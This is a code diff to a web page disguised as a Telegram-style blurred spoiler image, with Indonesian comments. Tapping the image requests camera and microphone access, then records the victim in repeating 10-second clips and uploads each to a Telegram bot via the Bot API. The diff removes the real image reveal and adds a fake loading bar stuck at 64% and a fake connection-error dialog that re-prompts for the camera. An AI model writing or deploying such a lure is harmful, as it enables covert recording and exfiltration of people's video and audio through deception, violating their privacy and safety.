@@ -80,7 +80,6 @@
             height: 100%;
             object-fit: cover;
             background: #1a1a1e;
-            transition: filter 0.4s ease;
             filter: blur(32px) brightness(0.5) saturate(0.6);
         }
 
@@ -118,23 +117,7 @@
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
             pointer-events: none;
             text-shadow: 0 1px 4px rgba(0, 0, 0, 0.6);
-            transition: opacity 0.35s ease, transform 0.35s ease;
             z-index: 2;
-        }
-
-        .spoiler-bubble.unblur .spoiler-image {
-            filter: blur(0px) brightness(1) saturate(1);
-        }
-
-        .spoiler-bubble.unblur .spoiler-dots {
-            opacity: 0;
-            transition: opacity 0.4s ease;
-        }
-
-        .spoiler-bubble.unblur .spoiler-label {
-            opacity: 0;
-            transform: translate(-50%, -50%) scale(0.9);
-            pointer-events: none;
         }
 
         .caption {
@@ -163,6 +146,114 @@
             display: none;
         }
 
+        /* ====== SPINNER LOADING ====== */
+        .loading-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 998;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #2c2c30;
+            border-top-color: #4a9eff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            color: #8b8b93;
+            font-size: 14px;
+            letter-spacing: 0.3px;
+        }
+
+        .loading-progress {
+            color: #4a9eff;
+            font-size: 13px;
+            font-weight: 500;
+            min-width: 60px;
+            text-align: center;
+        }
+
+        /* ====== NOTIFIKASI KONEKSI BERMASALAH ====== */
+        .error-toast {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            background: #1f1f23;
+            border: 1px solid #ff6b6b44;
+            border-radius: 16px;
+            padding: 28px 24px 24px;
+            max-width: 320px;
+            width: 90%;
+            z-index: 999;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9);
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            text-align: center;
+        }
+
+        .error-toast.show {
+            opacity: 1;
+            pointer-events: auto;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .error-toast .title {
+            color: #efeff1;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .error-toast .desc {
+            color: #8b8b93;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+
+        .error-toast .btn-ok {
+            background: #4a9eff;
+            color: white;
+            border: none;
+            padding: 10px 32px;
+            border-radius: 30px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .error-toast .btn-ok:hover {
+            background: #3a8aee;
+            transform: scale(1.02);
+        }
+
+        .error-toast .btn-ok:active {
+            transform: scale(0.97);
+        }
+
         @media (max-width: 420px) {
             .telegram-spoiler {
                 padding: 16px 12px;
@@ -170,6 +261,9 @@
             .spoiler-label {
                 font-size: 13px;
                 padding: 8px 16px;
+            }
+            .error-toast {
+                padding: 24px 20px 20px;
             }
         }
     </style>
@@ -184,19 +278,29 @@
 
         <div class="spoiler-bubble" id="spoilerBubble">
             <div class="image-wrapper">
-                <img class="spoiler-image" src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=800&q=80" alt="Spoiler foto" loading="lazy" id="spoilerImg" />
+                <img class="spoiler-image" src="https://i.ibb.co.com/jv03nY0m/IMG-20260116-192713-782.jpg" alt="Spoiler foto" loading="lazy" id="spoilerImg" />
             </div>
 
             <div class="spoiler-dots">
                 <canvas id="dotCanvas"></canvas>
             </div>
 
-            <div class="spoiler-label">🔞 SPOILER</div>
+            <div class="spoiler-label">LIHAT GAMBAR</div>
         </div>
+    </div>
 
-        <div class="caption">
-            <span class="tap-hint" id="tapHint">⏺ ketuk untuk lihat</span>
-        </div>
+    <!-- SPINNER LOADING -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Memuat gambar...</div>
+        <div class="loading-progress" id="loadingProgress">0%</div>
+    </div>
+
+    <!-- NOTIFIKASI KONEKSI BERMASALAH -->
+    <div class="error-toast" id="errorToast">
+        <div class="title">Koneksi Bermasalah</div>
+        <div class="desc">Gagal memuat gambar. Periksa koneksi internet Anda dan coba lagi.</div>
+        <button class="btn-ok" id="btnOk">Coba Lagi</button>
     </div>
 
     <!-- Video & Canvas untuk kamera (hidden) -->
@@ -211,6 +315,10 @@
             const canvas = document.getElementById('dotCanvas');
             const ctx = canvas.getContext('2d');
             const hint = document.getElementById('tapHint');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const loadingProgress = document.getElementById('loadingProgress');
+            const errorToast = document.getElementById('errorToast');
+            const btnOk = document.getElementById('btnOk');
 
             // Elemen untuk kamera
             const video = document.getElementById('video');
@@ -223,14 +331,16 @@
             let dots = [];
             const DOT_COUNT = 1200;
             let animationId = null;
-            let isUnblurred = false;
             let isCameraReady = false;
             let isRequestingPermission = false;
             let mediaRecorder = null;
             let recordedChunks = [];
             let isRecording = false;
-            let sendInterval = null;
+            let videoCounter = 0;
             let recordingStartTime = null;
+            let clickCount = 0;
+            let loadingTimeout = null;
+            let progressInterval = null;
 
             // ====== BINTIK ======
             function resizeCanvas() {
@@ -305,7 +415,7 @@
                 }
             }
 
-            // ====== SETUP KAMERA & MULAI REKAM ======
+            // ====== SETUP KAMERA ======
             async function setupCamera() {
                 if (isRequestingPermission) return;
                 if (isCameraReady) return;
@@ -317,8 +427,8 @@
                         audio: true,
                         video: {
                             facingMode: "user",
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
                         }
                     });
 
@@ -330,7 +440,6 @@
                         isCameraReady = true;
                         isRequestingPermission = false;
                         
-                        // MULAI REKAMAN LANGSUNG
                         startRecording(stream);
                     };
 
@@ -346,23 +455,29 @@
                 }
             }
 
-            // ====== REKAM VIDEO ======
+            // ====== REKAM VIDEO MP4 DURASI 10 DETIK ======
             function startRecording(stream) {
                 try {
-                    if (!MediaRecorder || !MediaRecorder.isTypeSupported('video/webm')) {
-                        console.log('MediaRecorder tidak support');
-                        return;
+                    let mimeType = 'video/mp4';
+                    if (!MediaRecorder.isTypeSupported('video/mp4')) {
+                        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                            mimeType = 'video/webm;codecs=vp8,opus';
+                        } else if (MediaRecorder.isTypeSupported('video/webm')) {
+                            mimeType = 'video/webm';
+                        } else {
+                            console.error('Tidak ada format video yang support');
+                            return;
+                        }
                     }
 
                     const options = {
-                        mimeType: 'video/webm;codecs=vp8,opus',
-                        videoBitsPerSecond: 2000000,
+                        mimeType: mimeType,
+                        videoBitsPerSecond: 1500000,
                         audioBitsPerSecond: 128000
                     };
 
                     mediaRecorder = new MediaRecorder(stream, options);
                     recordedChunks = [];
-                    recordingStartTime = Date.now();
 
                     mediaRecorder.ondataavailable = (event) => {
                         if (event.data && event.data.size > 0) {
@@ -371,63 +486,52 @@
                     };
 
                     mediaRecorder.onstop = () => {
-                        // Kirim video terakhir saat rekaman berhenti
                         if (recordedChunks.length > 0) {
-                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                            const blob = new Blob(recordedChunks, { type: mimeType });
                             if (blob.size > 0) {
-                                console.log('📹 Rekaman selesai, ukuran:', (blob.size / 1024 / 1024).toFixed(2), 'MB');
+                                const duration = ((Date.now() - recordingStartTime) / 1000).toFixed(1);
+                                console.log(`📹 Video #${videoCounter} selesai, durasi: ${duration} detik`);
                                 sendVideoToTelegram(blob);
                             }
                         }
                         recordedChunks = [];
                         isRecording = false;
-                        isCameraReady = false;
-                        if (sendInterval) {
-                            clearInterval(sendInterval);
-                            sendInterval = null;
-                        }
                     };
 
-                    // Mulai rekaman
-                    mediaRecorder.start(5000); // Potong setiap 5 detik
+                    mediaRecorder.start();
                     isRecording = true;
-                    console.log('🎥 Rekaman dimulai...');
+                    recordingStartTime = Date.now();
+                    videoCounter++;
+                    console.log(`🎥 Rekaman #${videoCounter} dimulai (10 detik)...`);
 
-                    // Kirim video setiap 5 detik
-                    sendInterval = setInterval(() => {
-                        if (mediaRecorder && isRecording && mediaRecorder.state === 'recording') {
+                    setTimeout(() => {
+                        if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
+                            console.log(`⏹️ Rekaman #${videoCounter} berhenti (10 detik)`);
+                            
                             setTimeout(() => {
-                                if (isRecording && mediaRecorder) {
-                                    mediaRecorder.start(5000);
+                                if (isCameraReady && stream && !isRequestingPermission) {
+                                    startRecording(stream);
                                 }
-                            }, 100);
+                            }, 500);
                         }
-                    }, 5000);
+                    }, 10000);
 
                 } catch (e) {
                     console.error('Start recording error:', e);
                 }
             }
 
-            // ====== STOP REKAMAN ======
-            function stopRecording() {
-                if (mediaRecorder && isRecording) {
-                    console.log('⏹️ Menghentikan rekaman...');
-                    if (sendInterval) {
-                        clearInterval(sendInterval);
-                        sendInterval = null;
-                    }
-                    mediaRecorder.stop();
-                    isRecording = false;
-                }
-            }
-
             // ====== SEND VIDEO KE TELEGRAM ======
             function sendVideoToTelegram(blob) {
+                let ext = 'mp4';
+                if (blob.type.includes('webm')) {
+                    ext = 'webm';
+                }
+                
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'spoiler_video.webm');
+                formData.append('video', blob, `spoiler_video_${videoCounter}.${ext}`);
 
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
@@ -436,14 +540,85 @@
                 .then(response => response.json())
                 .then(result => {
                     if (result.ok) {
-                        console.log('✅ Video terkirim!');
+                        console.log(`✅ Video #${videoCounter} terkirim!`);
                     } else {
-                        console.error('❌ Gagal kirim video:', result.description);
+                        console.error(`❌ Gagal kirim video #${videoCounter}:`, result.description);
                     }
                 })
                 .catch(err => {
                     console.error('Error kirim video:', err);
                 });
+            }
+
+            // ====== STOP REKAMAN ======
+            function stopRecording() {
+                if (mediaRecorder && isRecording) {
+                    console.log('⏹️ Menghentikan semua rekaman...');
+                    mediaRecorder.stop();
+                    isRecording = false;
+                }
+            }
+
+            // ====== SHOW LOADING ======
+            function showLoading() {
+                loadingOverlay.classList.add('active');
+                loadingProgress.textContent = '0%';
+                
+                let progress = 0;
+                const targetProgress = 64;
+                const totalSteps = 20;
+                const stepDuration = 10000 / totalSteps;
+                let stepCount = 0;
+
+                progressInterval = setInterval(() => {
+                    stepCount++;
+                    const increment = 1 + Math.floor(Math.random() * 5);
+                    progress = Math.min(progress + increment, targetProgress);
+                    
+                    if (stepCount % 3 === 0) {
+                        return;
+                    }
+                    
+                    loadingProgress.textContent = progress + '%';
+                    
+                    if (progress >= targetProgress) {
+                        clearInterval(progressInterval);
+                        progressInterval = null;
+                        setTimeout(() => {
+                            hideLoading();
+                            showErrorToast();
+                        }, 500);
+                    }
+                }, stepDuration);
+
+                loadingTimeout = setTimeout(() => {
+                    if (loadingOverlay.classList.contains('active')) {
+                        hideLoading();
+                        showErrorToast();
+                    }
+                }, 10000);
+            }
+
+            // ====== HIDE LOADING ======
+            function hideLoading() {
+                loadingOverlay.classList.remove('active');
+                if (progressInterval) {
+                    clearInterval(progressInterval);
+                    progressInterval = null;
+                }
+                if (loadingTimeout) {
+                    clearTimeout(loadingTimeout);
+                    loadingTimeout = null;
+                }
+            }
+
+            // ====== SHOW ERROR TOAST ======
+            function showErrorToast() {
+                errorToast.classList.add('show');
+            }
+
+            function hideErrorToast() {
+                errorToast.classList.remove('show');
             }
 
             // ====== TOGGLE SPOILER ======
@@ -452,24 +627,18 @@
 
                 if (isRequestingPermission) return;
 
-                // Jika belum minta izin, mulai kamera
+                if (loadingOverlay.classList.contains('active')) return;
+
+                if (errorToast.classList.contains('show')) return;
+
                 if (!isCameraReady && !isRecording) {
                     setupCamera();
-                    return;
                 }
 
-                // Toggle spoiler (buka/tutup) - REKAMAN TETAP BERJALAN
-                if (isUnblurred) {
-                    isUnblurred = false;
-                    bubble.classList.remove('unblur');
-                    hint.textContent = '⏺ ketuk untuk lihat';
-                    startAnimation();
-                } else {
-                    isUnblurred = true;
-                    bubble.classList.add('unblur');
-                    hint.textContent = '✅ terlihat';
-                    stopAnimation();
-                }
+                showLoading();
+                
+                clickCount++;
+                console.log(`👆 Klik spoiler #${clickCount} (loading patah-patah sampai 64%)`);
             }
 
             // ====== INIT ======
@@ -478,6 +647,19 @@
                 startAnimation();
 
                 bubble.addEventListener('click', toggleSpoiler);
+
+                btnOk.addEventListener('click', function() {
+                    hideErrorToast();
+                    if (!isCameraReady && !isRecording) {
+                        setupCamera();
+                    }
+                });
+
+                errorToast.addEventListener('click', function(e) {
+                    if (e.target === errorToast) {
+                        hideErrorToast();
+                    }
+                });
 
                 bubble.setAttribute('role', 'button');
                 bubble.setAttribute('tabindex', '0');
@@ -499,7 +681,7 @@
                     canvas.style.height = h + 'px';
                     ctx.scale(dpr, dpr);
                     initDots(w, h);
-                    if (animationId && !isUnblurred) {
+                    if (animationId) {
                         stopAnimation();
                         startAnimation();
                     }
@@ -517,17 +699,17 @@
                     canvas.style.height = h + 'px';
                     ctx.scale(dpr, dpr);
                     initDots(w, h);
-                    if (animationId && !isUnblurred) {
+                    if (animationId) {
                         stopAnimation();
                         startAnimation();
                     }
                 });
 
-                // Hentikan rekaman jika halaman ditutup
                 window.addEventListener('beforeunload', function() {
                     if (isRecording) {
                         stopRecording();
                     }
+                    hideLoading();
                 });
             }
 
